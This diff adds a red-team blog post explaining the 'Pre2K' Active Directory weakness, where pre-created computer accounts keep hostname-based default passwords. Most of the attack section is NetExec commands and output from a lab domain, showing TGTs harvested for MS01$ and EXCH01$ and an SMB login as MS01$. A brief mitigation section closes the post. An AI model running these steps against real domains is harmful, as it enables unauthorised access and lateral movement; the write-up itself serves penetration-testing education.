@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Practical Pre-Staged Computer Accounts Abuse in AD OUs: Pre2K Attack // byt3n33dl3</title>
+    <link rel="icon" type="image/png" href="../images/logo.png">
+    <link rel="stylesheet" href="../theme/css/pure.css">
+    <link rel="stylesheet" href="../theme/css/styles.css">
+    <link rel="stylesheet" href="../theme/css/pygments.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar pure-u">
+        <div class="cover-img"></div>
+        <div class="cover-body">
+            <header class="header">
+                <hgroup>
+                    <h1 class="brand-main"><a href="../index.html">AdverXarial</a></h1>
+                    <p class="tagline">Red Team // Adversary Emulator // Maintained by byt3n33dl3</p>
+                    <p class="links">
+                        <a href="../pages/about.html">About</a>
+                        <a href="https://byt3n33dl3.substack.com/">Archives</a>
+                    </p>
+                    <p class="social">
+                        <a href="https://github.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/github.svg" width="20" height="20" alt="GitHub">
+                        </a>
+                        <a href="#">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/linkedin.svg" width="20" height="20" alt="LinkedIn">
+                        </a>
+                        <a href="https://x.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/twitter.svg" width="20" height="20" alt="Twitter">
+                        </a>
+                    </p>
+                </hgroup>
+            </header>
+        </div>
+    </div>
+
+    <div class="pure-u">
+        <div class="content">
+            <div class="post-header">
+                <img src="../images/logo.png" alt="avatar" class="post-avatar">
+                <div class="post-meta-wrapper">
+                    <h2 class="post-author"><a href="../pages/byt3n33dl3.html">byt3n33dl3</a></h2>
+                    <p class="post-date">Published Sat 14 Mar 2026</p>
+                </div>
+            </div>
+
+            <p class="back-link"><a href="../index.html">← Home</a></p>
+
+            <article class="post-content">
+                <h1>Practical Pre-Staged Computer Accounts Abuse in AD OUs: Pre2K Attack</h1>
+                <p class="post-tags">Tags: <a href="#">Red Teaming</a> · <a href="#">ADUC</a> · <a href="#">NetExec</a> · <a href="#">BloodHound</a></p>
+
+                <p class="post-meta">Blog released: 2026 Sat 14 Mar.</p>
+
+                <h1>Overviews</h1>
+
+                <p>Pre2K attack: affected by <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7a76a403-ed8d-4c39-adb7-a3255cab82c5"><ins>Pre-Windows 2000 compatibility</ins></a> which is a legacy configuration option that has persisted in Active Directory environments since the early days of Windows domain infrastructure.</p> 
+                
+                <p>When an administrator manually pre-creates a computer object inside Active Directory Users and Computers (ADUC) before the physical machine actually joins the domain, the resulting account is assigned a default password that matches the computer's hostname in lowercase.</p> 
+                
+                <p>For instance, a computer object named <ins>MS01 would be assigned the password ms01,</ins> and <ins>EXCH01 would receive exch01.</ins></p>
+
+                <div class="video-container">
+                <img alt="bh-enterprise" width="50%" src="../images/pre2k-from-twitter-netexec.png"></iframe>
+                </div>
+                
+                <h2>Risk Evaluation</h2>
+
+                <p>Computer accounts in Active Directory is not a passive object. It is a legitimate domain principal, capable of authenticating via Kerberos, obtaining TGTs from the KDC, and being used as a foothold for subsequent lateral movement or privilege escalation.</p> 
+                
+                <p>In environments where such accounts accumulate over time due to poor lifecycle management or rushed provisioning workflows, the attack surface becomes considerable.</p>
+                
+                <h1>Practical Adversary</h1>
+                
+                <p>Tools being involve:</p>
+
+                <div class="video-container">
+                <img alt="bh-enterprise" width="23%" src="../images/BHE-logo-square.svg"></iframe>
+                </div>
+                
+                <ul>
+                    <li>BloodHound</li>
+                    <li>NetExec</li>
+                </ul>
+
+                <p>Having conditions were present at the start of this engagement and are representative of a standard internal penetration test scenario with an initial low-privileged domain user credential.</p>
+
+                <pre><code class="language-plaintext">user: pentest
+passwd: 5p3cter</code></pre>
+                
+                <p>Assumed we already BloodHound with our credential, let's looking at BloodHound:</p>
+                
+                <div class="video-container">
+                <img alt="pre2k" width="100%" src="../images/bloodhound-pre2k-indicator-01.jpeg"></iframe>
+                </div>
+                
+                <p>Our User have a plot, which turns-out he was under a Groups called Pre-Windows 2000!</p>
+
+                <div class="video-container">
+                <img alt="pre2k" width="100%" src="../images/bloodhound-pre2k-indicator-02.jpeg"></iframe>
+                </div>
+
+                <p>And Pre-Windows 2000 Groups having 3 Computers account under it, giving an opportunities to gain potential pre-create Password for ADUC Account.</p>
+
+                <p>Now...<ins>How to Attack!!</ins></p>
+
+                <p>Well, in easy method we can just try it with example of user DC01, meaning the password is dc01 (if no-changes).</p>
+
+                <p>For mor easy, we can just elevate NetExec LDAP protocol and specify a modules <code>-M pre2k</code> and NetExec would indicate which one is vuln, and automatically create the TGT key if Kerberos are strongly involved in this DC.</p>
+                
+                <pre><code class="language-plaintext">┌──(byt3n33dl3㉿kali)-[~]
+└─$ faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" netexec ldap DC01.megacorp.local -u pentest -p '5p3cter' -k
+LDAP        DC01.megacorp.local 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:megacorp.local)
+LDAP        DC01.megacorp.local 389    DC01             [+] megacorp.local\pentest:5p3cter</code></pre>
+                
+                <p>Try the <code>-M pre2k</code></p>
+
+                <pre><code class="language-plaintext">┌──(byt3n33dl3㉿kali)-[~]
+└─$ faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" netexec ldap DC01.megacorp.local -u pentest -p '5p3cter' -k -M pre2k
+LDAP        DC01.megacorp.local 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:megacorp.local)
+LDAP        DC01.megacorp.local 389    DC01             [+] megacorp.local\pentest:5p3cter 
+PRE2K       DC01.megacorp.local 389    DC01             Pre-created computer account: MS01$
+PRE2K       DC01.megacorp.local 389    DC01             Pre-created computer account: EXCH01$
+PRE2K       DC01.megacorp.local 389    DC01             [+] Found 2 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/megacorp.local/precreated_computers.txt
+PRE2K       DC01.megacorp.local 389    DC01             [+] Successfully obtained TGT for ms01@megacorp.local
+PRE2K       DC01.megacorp.local 389    DC01             [+] Successfully obtained TGT for exch01@megacorp.local
+PRE2K       DC01.megacorp.local 389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/ccache</code></pre>
+
+                <p>Save the key:</p>
+
+                <pre><code class="language-plaintext">┌──(byt3n33dl3㉿kali)-[~]
+└─$ for f in /root/.nxc/modules/pre2k/ccache/*.ccache; do klist "$f"; done
+Ticket cache: FILE:/root/.nxc/modules/pre2k/ccache/exch01.ccache
+Default principal: exch01@MEGACORP.LOCAL
+
+Valid starting       Expires              Service principal
+03/14/2026 09:02:05  03/14/2026 19:02:05  krbtgt/MEGACORP.LOCAL@MEGACORP.LOCAL
+        renew until 03/15/2026 09:02:04
+Ticket cache: FILE:/root/.nxc/modules/pre2k/ccache/ms01.ccache
+Default principal: ms01@MEGACORP.LOCAL
+
+Valid starting       Expires              Service principal
+03/14/2026 09:02:04  03/14/2026 19:02:04  krbtgt/MEGACORP.LOCAL@MEGACORP.LOCAL
+        renew until 03/15/2026 09:02:04</code></pre>
+
+                <p>Don't forget the <code>Klists</code>, and lastly try manual:</p>
+
+                <pre><code class="language-plaintext">┌──(byt3n33dl3㉿kali)-[~]
+└─$ sudo faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" netexec smb DC01.megacorp.local -u 'MS01$' -p ms01 -k                                                                                                                                
+SMB         DC01.megacorp.local 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:megacorp.local) (signing:True) (SMBv1:False) 
+SMB         DC01.megacorp.local 445    DC01             [+] megacorp.local\MS01$:ms01</code></pre>
+
+                <p>Valid!</p>
+
+                <h1>Shout Outs</h1>
+
+                <p>Much Thanks to:</p>
+
+                <ul>
+                    <li><a href="https://github.com/SpecterOps/BloodHound/">SpecterOps</a></li>
+                </ul>
+
+                <h1>Closing Attack Paths</h1>
+
+                <p>The smallest ASR is to make any pre-created computer account with <code>PwdLastSet=0</code> that is not actively used should be disabled or deleted immediately. For accounts that are legitimately needed, the password must be rotated before the machine is permitted to rejoin the domain.</p>
+                
+                <p>Moreover, <a href="mailto:byt3n33dl3@pm.me"><ins>Proton me</ins></a> if you have further question and suggestion.</p>
+
+                <p>Happy hacking!</p>
+                
+                <p class="go-top"><a href="#">Go Top</a></p>
+            </article>
+
+            <footer class="footer">
+                <p>&copy; byt3n33dl3 2026 · Built with blood, sweat, and HTML · <a href="../pages/all.atom.xml">RSS</a></p>
+            </footer>
+        </div>
+    </div>
+</div>
+</body>
+</html>
